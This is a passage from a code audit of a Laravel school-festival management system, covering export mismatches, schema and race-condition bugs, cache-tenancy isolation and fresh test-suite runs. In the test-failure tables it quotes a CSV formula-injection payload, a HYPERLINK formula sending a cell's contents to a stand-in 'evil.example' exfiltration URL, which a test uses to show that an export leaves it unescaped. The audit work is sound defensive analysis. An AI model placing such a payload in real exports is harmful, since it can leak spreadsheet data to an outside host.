**Actual:** Only 2 `set_time_limit`/`ini_set` bumps exist across the whole export/report surface (`FestReportService.php:980-981`, guarding `attendanceSheetSchoolPdf()`'s per-student GD image decoding — its own comment cross-references `idCardsPreview()`'s identical bump for the identical reason) — none of the data-table CSV/Excel/PDF builders have an equivalent. `CsvExportDispatcher`'s size-threshold → queued-job pattern exists and is used by 4 named controllers (`FestFoodBillingController`, `FestFoodHostBillingController`, `UnifiedPaymentsController`, `PaymentHistoryController`) plus the separate, generic ERP `ReportRunner` — but none of the Fest module's own `FestExportService`/`FestReportService`/`FestSchoolReportExportService` CSV/Excel builders route through it.

**Impact:** A large "all-registrations"/"all-results" export for a big event runs synchronously inside the web request under default PHP limits with no queued alternative — it can time out or hit an out-of-memory 500 with no partial-progress recovery, the same failure class the team already had to firefight once for a related but different code path (ID-card photo embedding).

**Recommendation:** Wire `FestExportService`/`FestReportService`'s builders through the existing `CsvExportDispatcher` pattern, or at minimum apply the same limit bump already proven necessary for the sibling ID-card feature.

### EXP-07 — Downloads as `.xls` but is hand-built XML text, not real binary XLS
**Classification:** report mismatch · **P3**

**Actual:** `ExcelExport::download()` unconditionally appends `.xls` and sets `Content-Type: application/vnd.ms-excel; charset=UTF-8`, while the body (`spreadsheetXml()`) is hand-built "Excel 2003 XML"/SpreadsheetML text, not a real binary `.xls` (BIFF) file. This backs 6 `FestExportService` methods, 2 `FestSchoolReportExportService` methods, and 8 `FestReportService.php` call sites. By contrast, `App\Services\Spreadsheet\SpreadsheetWriter::xlsx()` genuinely uses `OpenSpout\Writer\XLSX\Writer` (real binary XLSX, `openspout/openspout: ^4.28` is a real direct dependency) for student/teacher/training-registration/tenant-user imports and platform reports — but none of the Fest export services use it.

**Impact:** Every Sahodaya/school admin downloading a Fest "spreadsheet" report sees an unnecessary Excel security-warning dialog on open.

**Recommendation:** Route Fest spreadsheet exports through the existing `SpreadsheetWriter`/openspout path instead of the hand-rolled SpreadsheetML string builder.

### EXP-08 — Item Registration Counts: PDF shows totals, Excel doesn't
**Classification:** report mismatch · **P3** · **Actor:** School admin

**Actual:** `itemCountsPdf()` accepts and displays `$totals` (registrations/estimated fee); `itemCountsExcel()` takes only `$rows`, with no totals mapping. Both controller callers (`exportItemCountsPdf`/`exportItemCountsExcel`) apply byte-identical row-filtering logic, but only the PDF caller calls `itemRegistrationTotals($rows)` and passes it through — the Excel caller never does, and the difference is deliberate-looking (identical filtering, divergent totals call), not incidental.

**Recommendation:** Append a totals row to `itemCountsExcel()`'s data collection, reusing `FestSchoolReportAnalyticsService::itemRegistrationTotals()`, which the PDF path already calls.

### EXP-09 — 20 of 30 report views have no empty-state handling
**Classification:** UI/navigation gap · **P3**

**Actual:** A **correction to the original claim's arithmetic**: of 30 total report Blade views, 10 use `@forelse` exclusively (fully covered), 5 use **both** `@forelse` and a plain `@foreach` in the same file — but in every one of those 5, the primary/outer record loop is the `@forelse`-covered one, and the plain `@foreach` is only a nested secondary loop (per-row criteria columns, per-row team members) that doesn't need its own empty-check. The **true** count of views with zero empty-state coverage anywhere is **20**, not the "25" the original claim's raw grep-overlap arithmetic implied (which mis-attributed the 5 mixed files as gaps). The core conclusion — a clear majority (20/30, two-thirds) silently render a blank table on zero rows — still holds, with a corrected number.

**Recommendation:** Standardize on `@forelse`/`@empty` for the primary record loop across the 20 affected views, or introduce one shared "no data" partial.

---

## 6. Technical audit

*(Schema constraints, transactions, indexes, N+1 queries, cache tenancy — the substrate the report/export/financial layers above sit on.)*

| Finding | Classification | Severity | One-line |
|---|---|---|---|
| TECH-01[TechAudit] | data-integrity issue | **P1** | `fest_groups` has zero indexes (chest-number uniqueness added, then force-dropped twice); `fest_participants` has no (item, student) uniqueness — both races proven live |
| TECH-02[TechAudit] | security issue | P3 | Cross-tenant cache-key collision is real only when the cache-tagging bootstrapper is inactive; both required-for-production gates aren't tied together in code |
| TECH-03[TechAudit] | confirmed bug | **P1** | Waitlist promotion has no lock/transaction guarding item capacity, unlike initial registration — a race can overshoot a hard ceiling, proven live |
| TECH-04[TechAudit] | data-integrity issue | P2 | Soft-deleted students vanish from report row-builders (blank name) while still billed by `billableStudentCount()` — proven live |
| TECH-05[TechAudit] | performance risk | P2 | `fest_marks` has no `event_id`-leading index; 22 call sites filter by bare `event_id`, forcing full table scans |
| TECH-06[TechAudit] | performance risk | P2 | 5 report methods run a fresh query per bucket (head/sport/area/team/school) inside a loop instead of batching once |
| TECH-07[TechAudit] | data-integrity issue | P2 | Batch invoice issuance is a 2-step write with no outer transaction; a mid-request failure leaves fee and invoice out of sync |
| TECH-08[TechAudit] | performance risk | P2 | Zero use of chunk/cursor across the whole ~7,600-line report/export layer; `studentsCsv()` loads every active student with no limit |
| TECH-09[TechAudit] | data-integrity issue | P3 | `fest_participants.student_id`/`teacher_id`/`event_id` carry no foreign key at all, unlike the table's own `group_id`/`registration_id` |

### TECH-01[TechAudit] — Duplicate chest numbers and duplicate item registrations are both possible at the schema level
**Classification:** data-integrity issue · **P1** · **Actor:** Sahodaya Admin / School Admin (registration + chest-number assignment)

**Expected:** The database schema should guarantee, independent of application code, that (a) no two team/group registrations in the same event share a chest number, and (b) a student cannot end up registered twice for the same item.

**Actual:** `fest_groups` (holds each team/group registration's shared chest number) has **zero indexes of any kind** in the fully-migrated schema. Its unique constraint (`fest_groups_event_chest_unique`) was added by one migration, **dropped** by a later one, **force-dropped again** by a third — whose `down()` is a literal no-op — and never replaced. Separately, `fest_participants` only enforces uniqueness on `(registration_id, student_id)`, not `(item_id, student_id)`, so the same student can be attached to two different `fest_registrations` rows for the identical item with no DB objection. The only real protection today is `FestEvent::lockForUpdate()` inside `FestRegistrationCreateService`'s transaction and `FestNumberingService`'s chest-assignment methods — a single-code-path safeguard with no schema backstop.

**Evidence:** `database/migrations/tenant/2026_08_26_000001_fest_group_chest_numbers.php:44-48` (adds the constraint); `2026_09_01_000001_fest_chest_scope_per_event_type.php:53-64` (drops it, nothing re-added); `2026_09_01_000002_fix_fest_groups_chest_constraint.php:10-19,32-34` (force-drops again, no-op `down()`). A scratch test (written/run/deleted) against the fully-migrated in-memory schema: `PRAGMA index_list('fest_groups')` returned **0 rows**; inserting a second `FestGroup` with the same `(event_id=1, chest_no=555)` **succeeded** (no exception), leaving 2 rows sharing that pair; creating two `FestParticipant` rows for the same `student_id` against two different registrations for the identical item also **succeeded**, leaving 2 rows.

**Impact:** Two competitors could physically share a chest number at a live event — marks entry, judge panels, and gate scanning are all keyed by chest number — misattributing marks/attendance between two real students; a student duplicated across two registrations for one item would be double-counted in participation-fee billing and could receive duplicate results/certificates.

**Recommendation:** Add a real unique index on `fest_groups(event_id, chest_no)`; add a unique (or partial/filtered unique) index enforcing at most one active `fest_participants` row per item+student.

### TECH-02[TechAudit] — Cache-tenancy isolation depends on two settings not tied together in code
**Classification:** security issue · **P3** · **Actor:** Any tenant viewing reports, ID cards, or fest-gate QR scans

**Actual:** A **substantial correction** to the original claim that "no tenant-aware cache bootstrapper exists": `Stancl\Tenancy\Bootstrappers\CacheTenancyBootstrapper` **is** registered whenever `CACHE_STORE` resolves to a taggable store (redis/memcached/dynamodb/array/octane) — and this app's own deployment docs mandate `CACHE_STORE=redis` in production. When active, Stancl's `CacheManager` transparently wraps every bare `Cache::` call — including all 3 originally-cited call sites, unmodified — in `Cache::tags(['tenant'.tenant()->getTenantKey()])`, so two tenants writing/reading the identical literal key land on different physical entries. **Live-proved this pass**: with `CACHE_STORE` forced to the taggable `array` store and the bootstrapper manually engaged for two tenants, tenant A wrote under a literal key and read it back; tenant B reading the **same literal key** got a clean `NULL` miss. A control run with no tenancy bootstrap at all, same key, **did** return tenant A's stale value — confirming the raw collision is real only in the mechanism's absence. Under the documented, required production configuration (per-Sahodaya DB + `CACHE_STORE=redis`), the specific leak does not reproduce.

**Real residual gap:** the entire mechanism is coincidentally gated behind the **same single flag** that controls physical DB-per-tenant switching — `InitializeTenancyByRouteTenant.php:19` skips tenancy initialization (and therefore cache tagging) entirely the instant that flag is false — even though cache isolation and DB isolation are conceptually independent. If a future deployment ever hosted 2+ genuine tenants sharing one DB in that mode, cache isolation would silently vanish too, since none of the 3 call sites add an independent tenant discriminator themselves.

**Evidence:** `config/tenancy.php:41-56,118-120`; `vendor/stancl/tenancy/src/Bootstrappers/CacheTenancyBootstrapper.php:27-35`; `vendor/stancl/tenancy/src/CacheManager.php:14-30`; `docs/erp/24-LIVE_SERVER_DEPLOYMENT.md:27,244`; `docs/erp/23-DEPLOYMENT_OPERATIONS.md:73`. Call sites: `FestReportService.php:834-839,1022-1027`; `FestIdCardService.php:769-780`; `FestQrVerificationService.php:40-42`.

**Recommendation:** Prefix the 3 call sites' own keys with the owning tenant id directly (defense-in-depth, independent of the external bootstrapper), or decouple cache-tenancy-bootstrap eligibility from the `database_per_sahodaya` flag. Either way, add CI coverage.

### TECH-03[TechAudit] — Waitlist promotion has no capacity lock (proven live)
**Classification:** confirmed bug · **P1** · **Actor:** School Admin (registration page load) / background job worker

**Expected:** Promoting a waitlisted registration into an approved slot should be serialized against the item/head's capacity limit the same way initial registration already is — `FestRegistrationCreateService::createForSchool()` explicitly takes `FestEvent::lockForUpdate()` to prevent exactly this class of race.

**Actual:** `FestRegistrationApprovalService::promoteAllEligibleWaitlisted()` reads every waitlisted registration, then for each one calls `FestParticipationLimitService::isHeadAtCapacity()` (a plain, **unlocked** `COUNT` query) and, if under capacity, immediately promotes — with no `DB::transaction()` and no `lockForUpdate()` anywhere in the method or file. It's dispatched via `PromoteWaitlistedRegistrationsJob`, which runs **inline on every GET** to the school registration page today (`QUEUE_CONNECTION=sync`), and concurrency becomes the norm the instant an async queue driver is adopted.

**Evidence:** `FestRegistrationApprovalService.php:110-147` (zero `DB::`/lock calls anywhere in the file); `FestParticipationLimitService.php:244-294` (`isHeadAtCapacity()`, unlocked `count()`); `PromoteWaitlistedRegistrationsJob.php:10-27,41-50`. A scratch test (written/run/deleted) manually interleaved two "concurrent" capacity checks before either write committed: a head with `max_participants=2`, 1 approved (1/2 used), 2 waitlisted registrations racing for the 1 remaining slot. Both `isHeadAtCapacity()` reads returned `false` before either write; both writes then proceeded to `submitted`. Final count against capacity 2: **3** — the ceiling was breached by one.

**Impact:** A capacity-constrained head/item can end up with more approved participants than its capacity allows, defeating the one hard ceiling the feature exists to enforce, under realistic concurrent page-load traffic.

**Recommendation:** Wrap `promoteAllEligibleWaitlisted()`'s per-registration check-then-promote in the same `DB::transaction()`+`lockForUpdate()` pattern `createForSchool()` already uses.

### TECH-04[TechAudit] — Soft-deleted students vanish from reports but stay billed
**Classification:** data-integrity issue · **P2** · **Actor:** Sahodaya Admin (fee totals, reports) / School Admin (roster maintenance)

**Actual:** `Student` uses Eloquent `SoftDeletes`; `FestParticipant::student()` is a plain `belongsTo(Student::class)` with no `withTrashed()`, so the default global scope silently hides a soft-deleted student from every relation-based read — including report row-builders doing `$p->student?->name ?? ...`. Meanwhile `FestSchoolEventFeeService::billableStudentCount()` counts directly off `fest_participants.student_id IS NOT NULL`, never joining through `Student`, so it is completely unaffected by the soft-delete and keeps billing.

**Evidence:** `Student.php:13`; `FestParticipant.php:34-37`; `FestSchoolEventFeeService.php:469-484`. A scratch test (written/run/deleted) reproduced exactly: `billableStudentCount()=1` both before and after `$student->delete()`; `$participant->fresh()->student?->name` = the real name before, `NULL` immediately after.

**Impact:** A school can be billed a participation fee for a student who no longer shows up by name anywhere in that event's participant reports — the charge is against an anonymous row, hard to explain or dispute.

**Recommendation:** Either exclude soft-deleted students from billable counts (join through `Student`, filter `deleted_at IS NULL`), or explicitly `withTrashed()` the relation in report row-builders so a soft-deleted student's name still renders (with a visible inactive marker) instead of going blank while still being charged.

### TECH-05[TechAudit] — `fest_marks` has no usable `event_id` index
**Classification:** performance risk · **P2** · **Actor:** Sahodaya/School/judge/mark-coordinator portals

**Actual:** `fest_marks` declares only `unique(['item_id','participant_id'])` — no other index; no index has `event_id` as a leftmost column, and neither Postgres nor sqlite auto-indexes FK columns, so a bare-`event_id` filter forces a sequential scan. A full grep across `app/Services/Events/*.php` finds **22** `FestMark::where/whereIn('event_id', ...)` sites — exceeding the original claim of "15+" — spanning `EventLifecycleGate`, `FestJudgeGateService`, `FestLifecycleService`, `FestPhasedWorkflowService`, `FestQualificationService`, `FestSportsAutoRankService`, `FestReportService`, `FestSchoolReportAnalyticsService`. The sibling `fest_registrations` table already got this exact fix in a dedicated migration — `fest_marks` never did.

**Recommendation:** Add an index on `fest_marks(event_id)` (or `(event_id, item_id)`), mirroring the fix already applied to `fest_registrations`.

### TECH-06[TechAudit] — 5 report methods query per bucket inside a loop instead of batching once
**Classification:** performance risk · **P2** · **Actor:** Sahodaya Admin (report generation and exports)

**Actual:** `headWiseParticipantRows()`, `sportsWiseParticipantRows()`, `areaWiseParticipantRows()` (twice over — once per area plus a second pair for the "unassigned items" bucket), and `teamSquadRows()` each run a fresh query (sometimes two) **inside** a `foreach` over the bucket collection. A fifth instance, `FestReportService::certificateCountsCsv()`, runs 4 separate queries **per school** in a loop, reachable today via the live, catalog-registered `certificate-counts` export. *Correction to the original citation:* the "positive contrast" method it named, `itemStatusRows()`, does not exist anywhere in the codebase — the method actually occupying that location (and carrying the batch-once/group-in-memory pattern this finding recommends copying) is `markEntryStatusRows()` (`FestReportService.php:187-289`), whose own comment explains exactly why the pattern matters (":198-199, fetched once so each row's expanded id group can be computed in memory instead of via a fresh query per item").

**Evidence:** `FestEventReportAnalyticsService.php:1011-1072,1082-1135,1138+,1343-1428`; `FestReportService.php:1273-1303` (`certificateCountsCsv()`); `FestReportCatalog.php:129,218` (live reachability confirmed).

**Impact:** For an event with 10–30+ item heads, or a Sahodaya with dozens to hundreds of schools, these endpoints issue tens to hundreds of avoidable round-trips on every generation.

**Recommendation:** Apply the same batch-then-group-in-memory rewrite `markEntryStatusRows()` already demonstrates to all 5 sites.

### TECH-07[TechAudit] — Batch invoice issuance is a non-atomic 2-step write
**Classification:** data-integrity issue · **P2** · **Actor:** Sahodaya Admin (batch invoice issuance)

**Actual:** `FestInvoiceService::issueForSchoolBatch()` first calls `FestRegistrationBatchFeeService::recalculateBatch()` (commits in its own internal transaction, persisting a `FestSchoolEventFee` row and line items), then, as a **separate top-level statement**, calls `FestEventInvoice::updateOrCreate()`. Neither call, nor the method as a whole, is wrapped in an outer `DB::transaction()` — confirmed by a full-file grep showing zero `DB::transaction` usage anywhere. `batchInvoiceNumber()` allocates the next invoice number via an unsynchronized `count()`-then-+1 read with no lock; a genuine collision is backstopped by `fest_event_invoices.invoice_number`'s unique constraint, so it surfaces as a hard failure on the losing concurrent request rather than a silent duplicate — but that failure path is itself unhandled.

**Evidence:** `FestInvoiceService.php` (337 lines, no `DB::transaction`, no `DB` import); `issueForSchoolBatch()` :78-121; `batchInvoiceNumber()` :123-131. Contrast: `FestRegistrationCreateService.php:140,388,544,597` and `LedgerPostingService.php:85,155` all open with `DB::transaction()`.

**Impact:** A mid-request failure while issuing a batch invoice leaves a school's fee total and its invoice record out of sync with no automatic recovery; the invoice-numbering race produces an unhandled 500 for the losing concurrent request.

**Recommendation:** Wrap the recalculate-then-upsert sequence in `DB::transaction()`; allocate `batchInvoiceNumber()` under the same row lock `FestNumberingService` already uses.

### TECH-08[TechAudit] — No chunking anywhere in the ~7,600-line report/export layer
**Classification:** performance risk · **P2** · **Actor:** Sahodaya Admin (report/export generation)

**Actual:** A grep across all 8 report/export files (`FestReportService.php` 1408 lines, `FestEventReportAnalyticsService.php` 1735, `FestSchoolReportAnalyticsService.php` 383, `FestSchoolReportExportService.php` 197, `FestCrossEventReportService.php` 1303, `FestReportController.php` 906, `FestExportController.php`/`FestSchoolReportController.php` 1677) for `chunk(`/`cursor(`/`LazyCollection` returns **zero** matches. `FestReportService::studentsCsv()` loads every active `Student` across every school in the Sahodaya with **no limit at all**. By contrast, `auditLogRows()` elsewhere in the same file applies an explicit `->limit(5000)` — awareness of the risk exists in at least one place, applied inconsistently.

**Impact:** For the largest realistic Sahodaya (hundreds of schools, tens of thousands of students across a district-level Kalolsavam), any of these exports risks high memory usage and long request/worker times with no fallback as the result set grows.

**Recommendation:** Convert the largest-result-set exports (student rosters, full-event participant/mark dumps) to `chunk()`/`cursor()` with a streamed writer — the streaming is already in place at the HTTP-response layer; only the underlying query needs to stop materializing everything via `->get()` first.

### TECH-09[TechAudit] — `fest_participants` is missing 3 of its 5 foreign keys
**Classification:** data-integrity issue · **P3** · **Actor:** Any workflow touching `fest_participants` alongside a hard-deleted parent record

**Actual:** `fest_participants` carries exactly two real foreign keys — `group_id → fest_groups.id` (SET NULL) and `registration_id → fest_registrations.id` (CASCADE). `student_id`, `teacher_id`, and `event_id` — all three FK-shaped columns on the table — carry **no** foreign key constraint at all, only ordinary non-FK indexes on `student_id`. A scratch test's `PRAGMA foreign_key_list('fest_participants')` against the fully-migrated schema returned exactly those 2 rows, nothing for the other 3 columns. This compounds `TECH-04`: a real student hard-erasure/restore feature exists in this codebase (`tests/Feature/Admin/StudentErasureRestoreCompletenessTest.php`), and if that workflow ever hard-deletes a `Student` row, any `fest_participants` referencing it become permanently dangling with zero DB signal.

**Recommendation:** Add `foreign('student_id')->references('id')->on('students')->nullOnDelete()` (and `teacher_id`/`event_id` equivalents).

---

## 7. TEST EXECUTION RESULTS

**This section reports exact commands and exact results, unsoftened. Every number below comes from a real, timestamped process run.** Two layers of evidence are presented: (1) the source dataset's own test-execution findings (`SUM-01`, `TECH-01[TestExec]`), transcribed exactly; (2) this pass's own **independent, fresh re-execution** of the same commands, run live in this session specifically to verify §7 rather than merely transcribe it. Where the two disagree, the disagreement is reported as a finding in its own right (§7.4) — not reconciled away.

### 7.1 The literal task-instruction command crashes with an out-of-memory fatal error

**Source finding `TECH-01[TestExec]`** (performance risk, P2): the documented, standard invocation —

```
php artisan test tests/Unit/Services/Events tests/Feature/Events tests/Feature/SahodayaAdmin tests/Feature/State tests/Feature/Public tests/Unit/Support tests/Unit/Middleware tests/Feature/Api/SahodayaApiTest.php tests/Feature/SahodayaAttendancePresentationTest.php tests/Feature/SahodayaCredentialsHubTest.php tests/Feature/SahodayaPublicContentTest.php tests/Feature/SahodayaPublicSiteTest.php tests/Feature/SahodayaSchoolCredentialsTest.php tests/Feature/SahodayaWebsiteSiteScopeTest.php tests/Feature/SahodayaWebsiteV2Test.php tests/Feature/SuperadminSahodayaAdminAccessTest.php tests/Feature/Console/ListPendingFestRegistrationsTest.php
```

— crashes deterministically with `PHP Fatal error: Allowed memory size of 134217728 bytes exhausted` (128MB, PHP's compiled-in default) inside Symfony's `HtmlErrorRenderer`, and prefixing it with `php -d memory_limit=1G` does **not** fix it, because `artisan test` forks a child PHPUnit process that does not inherit the parent CLI's `-d` override in this Laravel install.

**Independently re-run fresh in this session** (not transcribed — executed live): the literal command was run exactly as given, unmodified. Result: **identical crash**, same test, same limit:

```
Fatal error: Premature end of PHP process when running
Tests\Feature\SahodayaAdmin\BoardResultCertificationSyncTest::test_verify_is_blocked_until_school_certification_is_complete.
```

Before crashing, it had already run 146 tests (144 passed, 2 failed, 426 assertions, 8708ms) — and the 2 failures visible at that point (`FestSchoolReportBoundaryTest` 404-vs-302, `ScratchFormulaInjectionAuditTest` formula-payload assertion) are byte-identical in wording to two of the findings below (`RPT-03`/`TG-03` and `SEC-01[TestExec]`/`TG-07`). A second attempt with `php -d memory_limit=1G artisan test ...` prefixed reproduced the **exact same crash, exact same 134217728-byte figure**, confirming the source finding's claim that the `-d` flag does not reach the actual PHPUnit process in this installation. Running `vendor/bin/phpunit` **directly** (bypassing `artisan test`) with `-d memory_limit=1G` does not crash and completes cleanly — see §7.2.

**Recommendation (unchanged from source):** either raise the repo's default testing `memory_limit`, or standardize documentation/CI on invoking `vendor/bin/phpunit` directly with a higher limit, since `php artisan test`'s own `-d` passthrough does not reach the child process in this installation.

### 7.2 Focused suite (the 17 paths from §7.1, run via `vendor/bin/phpunit -d memory_limit=1G`)

**Command (run fresh, this session):**
```
php -d memory_limit=1G vendor/bin/phpunit tests/Unit/Services/Events tests/Feature/Events tests/Feature/SahodayaAdmin tests/Feature/State tests/Feature/Public tests/Unit/Support tests/Unit/Middleware tests/Feature/Api/SahodayaApiTest.php tests/Feature/SahodayaAttendancePresentationTest.php tests/Feature/SahodayaCredentialsHubTest.php tests/Feature/SahodayaPublicContentTest.php tests/Feature/SahodayaPublicSiteTest.php tests/Feature/SahodayaSchoolCredentialsTest.php tests/Feature/SahodayaWebsiteSiteScopeTest.php tests/Feature/SahodayaWebsiteV2Test.php tests/Feature/SuperadminSahodayaAdminAccessTest.php tests/Feature/Console/ListPendingFestRegistrationsTest.php
```

**Result, this session's fresh run:** `Tests: 357, Assertions: 2267, Failures: 7.` — **exact match** to the source (`SUM-01`: tests=357, passed=350, assertions=2267, failed=7). Duration: 19.9s this run vs. 18.47s in the source (normal run-to-run variance).

**All 7 failures, exact PHPUnit output, reconciled against the source's `TG-*`/`BUG-*`/`SEC-*[TestExec]` findings:**

| # | Test | Exact failure message | Root-cause finding | Root-cause status |
|---|---|---|---|---|
| 1 | `Tests\Feature\Events\FestSchoolReportBoundaryTest::test_program_route_rejects_an_event_of_another_type` | `Failed asserting that 302 is identical to 404.` | RPT-03 / TG-03 | Identified — deliberate UX change (redirect, not 404) the test wasn't updated for |
| 2 | `Tests\Feature\Api\SahodayaApiTest::test_sahodaya_admin_can_view_school_details` | `-'Govt HS' / +'GOVT HS'` | TG-01 | Identified — `Tenant::getNameAttribute()` force-uppercases `type=school` tenant names; the test fixture predates this accessor |
| 3 | `Tests\Feature\Api\SahodayaApiTest::test_schools_can_be_filtered_by_payment_status` | `-'Unpaid School' / +'UNPAID SCHOOL'` | TG-01 | Identified — same cause |
| 4 | `Tests\Feature\SahodayaAttendancePresentationTest::test_sixteen_students_fit_on_one_dompdf_page_section` | `Failed asserting that 2 is identical to 1.` | BUG-01 | Identified — **real rendering bug**, see §7.5 |
| 5 | `Tests\Feature\SahodayaWebsiteSiteScopeTest::test_v2_microsite_navigation_stays_inside_the_microsite` | `... contains "href=\"/m/innovation-expo#about-sahodaya\""` — a 23,843-char rendered page does not contain the expected hash-anchor link | *(not named by any source finding — see §7.6)* | Partially advanced this pass, still not fully confirmed |
| 6 | `Tests\Feature\SahodayaWebsiteV2Test::test_homepage_mode_follows_event_lifecycle_without_a_live_override` | `-'registration_open' / +'evergreen'` | TG-02 | Identified — test fixture creates the wrong model (`KalotsavEvent` instead of `FestEvent`), so the resolver never sees it |
| 7 | `Tests\Feature\Events\ScratchFormulaInjectionAuditTest::test_transaction_ref_formula_payload_is_not_escaped_in_csv_export` | Raw CSV `"=HYPERLINK(""https://evil.example/exfil?x=""&A1,""Click for receipt"")"` present, unneutralized | SEC-01[TestExec] / EXP-02 / TG-07 | Identified — **real vulnerability**, confirmed by raw bytes; the test's *own* assertion is miscalibrated (RFC4180 quote-doubling), which is why it shows red despite proving the bug true |

All 7 exactly match the source's own per-test claims where named; none are new.

### 7.3 Full suite — source data vs. this session's fresh run

**Source `SUM-01` claim** (`vendor/bin/phpunit`, no path args — all of `tests/Unit` + `tests/Feature`):
```
tests=809 passed=792 assertions=4063 duration_ms=45216 failed=16
```

**This session's fresh run**, same command, same flags:
```
time php -d memory_limit=1G vendor/bin/phpunit
```
```json
{"tool":"phpunit","result":"failed","tests":813,"passed":792,"assertions":4065,"duration_ms":45209,"failed":18}
```
(`time`: 41.16s user, 3.27s system, 97% CPU, 45.469s total wall clock.)

**passed=792 is identical.** `tests`, `assertions`, and `failed` are each **slightly higher** in this fresh run (+4 tests, +2 assertions, +2 failures) than in the source data. This is not noise — see §7.4.

**The full 18-failure list, this session's fresh run** (16 reconcile exactly against the source's named findings; 2 do not exist in the source dataset at all):

| # | Test | Root-cause finding | Status |
|---|---|---|---|
| 1 | `FestGradePointServiceGenericConfigTest::test_raw_score_bands_resolve_highest_match_regardless_of_storage_order` | **NEW — not in the source 68** | See §7.4 |
| 2 | `FestGradePointServiceGenericConfigTest::test_item_specific_band_takes_priority_over_event_wide` | **NEW — not in the source 68** | See §7.4 |
| 3 | `TeacherTrainingEligibilityServiceTest::test_region_ids_via_school_assignment` | TG-08 | Unresolved — source flags this explicitly as not traced within its own time budget; `Failed asserting that false is true.` is all either pass has |
| 4 | `SahodayaApiTest::test_sahodaya_admin_can_view_school_details` | TG-01 | Identified (§7.2) |
| 5 | `SahodayaApiTest::test_schools_can_be_filtered_by_payment_status` | TG-01 | Identified (§7.2) |
| 6 | `EmailTemplatesTest::test_verify_email_notification_renders_html_body` | TG-09 | Source flags unresolved; this pass captured the full actual-HTML dump (starts `<!DOCTYPE html>...<meta charset="utf-8">...`) but did not trace the specific expected-vs-actual content divergence either |
| 7 | `FestSchoolReportBoundaryTest::test_program_route_rejects_an_event_of_another_type` | RPT-03/TG-03 | Identified (§7.2) |
| 8 | `ScratchFormulaInjectionAuditTest::test_transaction_ref_formula_payload_is_not_escaped_in_csv_export` | SEC-01[TestExec]/EXP-02/TG-07 | Identified (§7.2) — real vulnerability |
| 9 | `ExampleTest::test_the_application_returns_a_successful_response` | TG-06 | Identified — `Expected response status code [200] but received 500 ... PDOException: SQLSTATE[HY000]: General error: 1 no such table: tenants`; this test has no `RefreshDatabase` trait, so it 500s when run without another test having already migrated the in-memory DB first |
| 10 | `PlaintextPasswordRevealTest::test_superadmin_tenants_show_does_not_ship_plaintext_password_but_reveal_endpoint_returns_it` | SEC-02[TestExec] | Identified — `Property [sahodayaAdmins.0.password] was found while it was expected to be missing.`; the shipped value is `null` (not the real password — confirmed non-issue for actual disclosure), just present as a key instead of omitted |
| 11 | `SahodayaAttendancePresentationTest::test_sixteen_students_fit_on_one_dompdf_page_section` | BUG-01 | Identified (§7.2) — real bug |
| 12 | `SahodayaWebsiteSiteScopeTest::test_v2_microsite_navigation_stays_inside_the_microsite` | — | See §7.6 |
| 13 | `SahodayaWebsiteV2Test::test_homepage_mode_follows_event_lifecycle_without_a_live_override` | TG-02 | Identified (§7.2) |
| 14 | `BoardResultCertificationControllerTest::test_full_school_certification_flow_via_http` | TG-04 | Identified — `Failed asserting that actual size 2 matches expected size 4.`; business rule changed (2 required certification reports, not 4) and the test wasn't updated |
| 15 | `BoardResultCertificationControllerTest::test_school_admin_cannot_sign_only_principal_or_vice_principal_can` | TG-03 (2nd case) | **Symptom independently confirmed this pass**: `Expected response status code [403] but received 302.` — identical shape to #7's 404-vs-302; source explicitly could not confirm this shares the same root cause within its own budget, and neither could this pass beyond the matching symptom |
| 16 | `BoardResultCertificationServiceTest::test_request_leadership_review_creates_package_and_pending_reports_for_class_x` | TG-04 | Identified — expected array `[full_a1, overall_toppers, subject_toppers, summary]`, actual `[full_a1, overall_toppers]`; same business-rule change as #14 |
| 17 | `BoardResultCertificationServiceTest::test_class_xii_report_definitions_are_generated_per_configured_stream` | TG-05 | Identified — expected `[9, 8]`, actual `[8, 9]`; a hardcoded test literal has its two stream-ID variables swapped, not an app bug |
| 18 | `TenantDomainTest::test_custom_domain_public_site_is_reachable` | TG-01 | Identified — same `Tenant::getNameAttribute()` uppercase accessor, this time on "St Marys School"; this test's captured HTML is also where `BUG-02` (JSON-LD corruption) was originally spotted incidentally |

**Rows 1–2 are addressed in §7.4. Row 12 is addressed in §7.6.** Every other row (3/16 named-but-source-unresolved cases aside) matches the source data exactly, confirming the source's own numbers are accurate as reported.

### 7.4 New finding, discovered only by this session's fresh re-run: `FestGradePointServiceGenericConfigTest` fails under full-suite ordering, passes in isolation

**Classification:** confirmed bug (test-isolation/pollution) · **Severity: P2** · **Not part of the source 68 findings** — this is new evidence this audit pass generated by actually re-executing the suite rather than only transcribing prior results.

**What was found:** `git diff --stat` confirms `app/Services/Events/FestGradePointService.php` and `app/Models/FestGradeConfig.php` are currently **modified and uncommitted** in the working tree (44 and 4 lines changed respectively) — an in-progress, unrelated feature (percentage-of-`total_marks` grade banding) layered on top of a documented prior fix ("highest matching band wins regardless of storage order"). Its own test file, `tests/Unit/Services/Events/FestGradePointServiceGenericConfigTest.php`, has 4 test methods.

- Run **in isolation**: `php -d memory_limit=1G vendor/bin/phpunit --filter=FestGradePointServiceGenericConfigTest tests/Unit/Services/Events/FestGradePointServiceGenericConfigTest.php` → `OK (4 tests, 12 assertions)`.
- Run **as part of the full suite**: the first 2 of those same 4 tests fail —
  - `test_raw_score_bands_resolve_highest_match_regardless_of_storage_order`: `Failed asserting that null is identical to 'A'.`
  - `test_item_specific_band_takes_priority_over_event_wide`: `Failed asserting that null is identical to 'A+'.`

Both failing tests exercise the **raw-score** (non-percentage) banding path; the other 2 tests in the same file, which exercise the new percentage-based path, pass in both isolation and full-suite contexts. This pass/fail divergence between isolated and full-suite runs is the classic signature of **shared mutable state leaking across tests** (a static property, memoized config, or non-reset container singleton) rather than a straightforwardly-wrong implementation — a wrong implementation would fail the same way in isolation too. This audit did **not** trace the exact pollution source (which earlier test in suite order is responsible) — that would require a bisection this pass's time budget did not allow — and is flagging the phenomenon precisely rather than guessing at a mechanism.

**Why the full-suite counts differ from the source data:** `tests=813` (this run) vs. `809` (source), `failed=18` vs. `16` — a delta of exactly `+4` tests and `+2` failures, consistent with this file's 2 newly-passing-in-isolation tests plus 2 more from the same feature having been **added to the file after `SUM-01`'s run**, while the working tree continued to change during this audit series. `passed=792` is identical between both runs, meaning no previously-passing test newly broke — the delta is additive (new tests, 2 of which currently fail under full-suite ordering), not a regression in previously-covered code.

